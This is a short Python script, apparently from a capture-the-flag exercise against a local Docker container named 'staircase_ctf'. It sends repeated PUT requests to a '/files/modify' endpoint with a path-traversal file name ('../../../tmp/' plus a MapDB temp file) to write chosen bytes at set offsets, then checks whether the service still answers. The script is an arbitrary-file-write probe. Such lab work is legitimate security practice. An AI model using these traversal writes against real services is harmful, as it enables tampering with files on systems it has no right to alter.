#!/usr/bin/env python3
"""测试多次连续写入"""
import requests
import base64
import subprocess
import time

def restart_container():
    subprocess.run("docker restart staircase_ctf", shell=True, capture_output=True)
    time.sleep(4)
    
def get_mapdb_name():
    result = subprocess.run('docker exec staircase_ctf sh -c "ls /tmp/mapdb*temp | head -1"', 
                           shell=True, capture_output=True, text=True)
    return result.stdout.strip().split('/')[-1]

def multi_write_test(mapdb_name, start_offset, num_writes):
    """测试多次连续写入"""
    url = 'http://localhost:8080'
    mapdb_path = f"../../../tmp/{mapdb_name}"
    
    # 每次写入 20 bytes (7 + 8 + 5)
    for i in range(num_writes):
        offset = start_offset + i * 20
        data = bytes([i % 256] * 8)
        
        payload = {
            'fileName': mapdb_path,
            'data': base64.b64encode(data).decode(),
            'offset': offset
        }
        
        try:
            resp = requests.put(f'{url}/files/modify', json=payload, timeout=5)
            if resp.status_code != 200:
                return i, f"Write {i} failed: {resp.status_code}"
        except Exception as e:
            return i, f"Write {i} exception: {e}"
    
    # 检查 icon
    try:
        resp = requests.get(f'{url}/files/icon', timeout=5)
        if resp.status_code == 200:
            return num_writes, "OK"
        else:
            return num_writes, f"Icon failed: {resp.status_code}"
    except Exception as e:
        return num_writes, f"Icon exception: {e}"

def main():
    # 测试从 0x100249 开始的多次写入
    start_offset = 0x100249
    
    for num_writes in [1, 5, 10, 20, 30, 40, 50]:
        restart_container()
        mapdb_name = get_mapdb_name()
        
        writes_done, result = multi_write_test(mapdb_name, start_offset, num_writes)
        print(f"Start=0x{start_offset:x}, Writes={num_writes:2d}: done={writes_done:2d}, result={result}")

if __name__ == "__main__":
    main()
